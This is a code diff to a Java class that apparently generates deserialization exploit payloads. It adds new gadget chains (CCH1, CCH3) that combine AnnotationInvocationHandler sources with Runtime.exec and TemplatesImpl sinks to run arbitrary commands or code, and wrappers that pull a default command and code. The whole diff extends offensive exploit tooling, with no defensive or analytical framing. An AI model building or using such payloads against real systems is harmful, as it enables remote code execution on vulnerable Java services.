@@ -9,6 +9,11 @@ public class GGC {
         return Source3.AnnotationInvocationHandlerSource(Sink3.RuntimeExecSink(command));
     }
 
+    @SinkTypeAnnotation(type = "command")
+    public static Object CCH1(String command) throws Exception {
+        return Source4.AnnotationInvocationHandlerSource(Sink4.RuntimeExecSink(command));
+    }
+
     @SinkTypeAnnotation(type = "code")
     public static Object CC2(String code) throws Exception {
         return Source4.PriorityQueueSource(Sink4.TemplatesImplNewTransformerSink(code));
@@ -17,6 +22,11 @@ public class GGC {
     @SinkTypeAnnotation(type = "code")
     public static Object CC3(String code) throws Exception {
         return Source3.AnnotationInvocationHandlerSource(Sink3.TemplatesImplTrAXFilterSink(code));
+    }
+
+    @SinkTypeAnnotation(type = "code")
+    public static Object CCH3(String code) throws Exception {
+        return Source4.AnnotationInvocationHandlerSource(Sink4.TemplatesImplTrAXFilterSink(code));
     }
 
     @SinkTypeAnnotation(type = "code")
@@ -173,6 +183,14 @@ public class GGC {
 
     public static Object CC12() throws Exception {
         return CC12(DefaultConfig.code);
+    }
+
+    public static Object CCH1() throws Exception {
+        return CCH1(DefaultConfig.command);
+    }
+
+    public static Object CCH3() throws Exception {
+        return CCH3(DefaultConfig.code);
     }
 
     public static Object CCH5() throws Exception {
